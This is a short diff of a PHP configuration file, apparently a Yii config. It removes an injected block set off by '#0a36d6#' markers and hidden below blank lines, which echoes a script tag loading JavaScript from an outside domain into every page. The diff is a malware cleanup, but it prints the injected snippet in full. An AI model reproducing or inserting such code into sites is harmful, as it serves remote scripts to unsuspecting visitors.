@@ -16,16 +16,4 @@ return CMap::mergeArray(
 	)
 );
 
-
-
-
-
-
-
-#0a36d6#
-if(empty($w)) {
-$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383382\"></script>";
-echo $w;
-}
-#/0a36d6#
-
+ 
